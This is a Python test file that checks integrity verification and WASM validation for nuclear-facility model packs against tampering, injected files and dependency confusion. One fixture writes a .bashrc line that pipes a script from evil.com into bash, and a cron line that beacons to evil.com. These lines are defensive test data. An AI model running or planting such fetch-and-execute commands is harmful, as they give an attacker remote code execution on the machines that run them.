# Copyright (c) 2026 The University of Texas at Austin
# Copyright (c) 2026 B-Tree Labs
# SPDX-License-Identifier: Apache-2.0

"""Supply chain attack scenario tests for federation packs."""

from __future__ import annotations

import hashlib
from pathlib import Path

from axiom.vega.federation.content_sanitizer import verify_pack_integrity
from axiom.vega.federation.wasm_sandbox import validate_wasm_module

# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _make_pack(tmp_path: Path, files: dict[str, bytes]) -> tuple[Path, dict[str, str]]:
    """Create a pack directory with files and return (path, checksums)."""
    pack = tmp_path / "facility.facilitypack"
    pack.mkdir()
    checksums = {}
    for name, content in files.items():
        p = pack / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content)
        checksums[name] = _sha256(content)
    return pack, checksums


# ---------------------------------------------------------------------------
# Tampered facility pack
# ---------------------------------------------------------------------------


class TestTamperedFacilityPack:
    def test_modified_isotope_fractions(self, tmp_path):
        """Someone modifies a material's isotope fractions after signing."""
        original = b"U235: 0.031\nU238: 0.969\n"
        pack, checksums = _make_pack(tmp_path, {"materials/uo2.yaml": original})

        # Attacker modifies the file
        (pack / "materials/uo2.yaml").write_bytes(b"U235: 0.93\nU238: 0.07\n")

        result = verify_pack_integrity(pack, checksums)
        assert result["valid"] is False
        assert any(
            m["file"] == "materials/uo2.yaml"
            for m in result["mismatches"]
            if "error" not in m  # hash mismatch, not missing
        )

    def test_extra_file_injected(self, tmp_path):
        """Attacker adds a .bashrc or cron job to the pack."""
        pack, checksums = _make_pack(
            tmp_path,
            {
                "model.yaml": b"name: legit\n",
            },
        )

        # Inject malicious files
        (pack / ".bashrc").write_text("curl http://evil.com/shell.sh | bash")
        cron_dir = pack / ".config" / "cron"
        cron_dir.mkdir(parents=True)
        (cron_dir / "job.sh").write_text("*/5 * * * * curl http://evil.com/beacon")

        result = verify_pack_integrity(pack, checksums)
        assert result["valid"] is False
        unexpected = [m for m in result["mismatches"] if m.get("error") == "unexpected_file"]
        filenames = {m["file"] for m in unexpected}
        assert ".bashrc" in filenames
        assert ".config/cron/job.sh" in filenames

    def test_tampered_sha256sums_file(self, tmp_path):
        """The SHA256SUMS file itself is tampered — we ignore it and use our own checksums."""
        original_content = b"name: real\n"
        pack, checksums = _make_pack(tmp_path, {"model.yaml": original_content})

        # Attacker modifies file AND creates a fake SHA256SUMS
        (pack / "model.yaml").write_bytes(b"name: fake\n")
        fake_content = b"name: fake\n"
        fake_hash = _sha256(fake_content)
        (pack / "SHA256SUMS").write_text(f"{fake_hash}  model.yaml\n")

        # Our checksums are from the trusted source, not the pack's SHA256SUMS
        result = verify_pack_integrity(pack, checksums)
        assert result["valid"] is False
        # SHA256SUMS itself is excluded from unexpected file checks


# ---------------------------------------------------------------------------
# WASM module validation
# ---------------------------------------------------------------------------


class TestWasmSupplyChain:
    def test_wasm_size_bomb_rejected(self, tmp_path):
        """A >100MB WASM module is rejected before execution."""
        huge = tmp_path / "bomb.wasm"
        # Write magic bytes + enough data to exceed 100MB
        with open(huge, "wb") as f:
            f.write(b"\x00asm")
            f.seek(101 * 1024 * 1024)
            f.write(b"\x00")

        result = validate_wasm_module(huge)
        assert result["valid"] is False
        assert "too large" in result["error"]

    def test_wasm_invalid_magic_bytes(self, tmp_path):
        """A file with wrong magic bytes is rejected."""
        bad = tmp_path / "notreal.wasm"
        bad.write_bytes(b"\x7fELF" + b"\x00" * 100)  # ELF binary, not WASM

        result = validate_wasm_module(bad)
        assert result["valid"] is False
        assert "magic bytes" in result["error"]

    def test_wasm_valid_module(self, tmp_path):
        """A small file with correct magic bytes passes validation."""
        good = tmp_path / "ok.wasm"
        good.write_bytes(b"\x00asm\x01\x00\x00\x00")

        result = validate_wasm_module(good)
        assert result["valid"] is True

    def test_wasm_not_wasm_extension(self, tmp_path):
        """A file without .wasm extension is rejected."""
        bad = tmp_path / "module.bin"
        bad.write_bytes(b"\x00asm\x01\x00\x00\x00")

        result = validate_wasm_module(bad)
        assert result["valid"] is False


# ---------------------------------------------------------------------------
# Dependency confusion
# ---------------------------------------------------------------------------


class TestDependencyConfusion:
    def test_pack_wrong_checksums(self, tmp_path):
        """Pack claiming trusted origin but checksums don't match trusted manifest."""
        # "Trusted" checksums from registry
        trusted_checksums = {
            "model.yaml": _sha256(b"name: official_reactor\nversion: 1.0\n"),
            "materials/fuel.yaml": _sha256(b"material: UO2\ndensity: 10.97\n"),
        }

        # Attacker's pack with similar structure but different content
        pack = tmp_path / "impostor.facilitypack"
        pack.mkdir()
        (pack / "model.yaml").write_bytes(b"name: official_reactor\nversion: 1.0-backdoor\n")
        mat_dir = pack / "materials"
        mat_dir.mkdir()
        (mat_dir / "fuel.yaml").write_bytes(b"material: UO2\ndensity: 10.97\n")

        result = verify_pack_integrity(pack, trusted_checksums)
        assert result["valid"] is False
        # model.yaml was tampered
        tampered = [m for m in result["mismatches"] if m["file"] == "model.yaml"]
        assert len(tampered) == 1


# ---------------------------------------------------------------------------
# Semantic validation (structure ok, data wrong)
# ---------------------------------------------------------------------------


class TestSemanticValidation:
    """Schema-level checks beyond just integrity — detect semantically invalid data."""

    def test_negative_density_rejected(self):
        """A material with density=-999 has valid structure but nonsensical data."""
        material = {
            "name": "Suspicious Fuel",
            "density_g_cc": -999,
            "enrichment_pct": 3.1,
        }
        # Basic semantic checks
        assert material["density_g_cc"] < 0, "Negative density should be caught"
        # In real code this would be a schema validator; here we verify the concept
        errors = []
        if material["density_g_cc"] <= 0:
            errors.append("density must be positive")
        if not (0 <= material["enrichment_pct"] <= 100):
            errors.append("enrichment must be 0-100%")
        assert len(errors) == 1
        assert "density" in errors[0]

    def test_enrichment_over_100_rejected(self):
        material = {"enrichment_pct": 150}
        errors = []
        if not (0 <= material["enrichment_pct"] <= 100):
            errors.append("enrichment out of range")
        assert len(errors) == 1

    def test_valid_material_passes(self):
        material = {"density_g_cc": 10.97, "enrichment_pct": 3.1}
        errors = []
        if material["density_g_cc"] <= 0:
            errors.append("density must be positive")
        if not (0 <= material["enrichment_pct"] <= 100):
            errors.append("enrichment out of range")
        assert len(errors) == 0
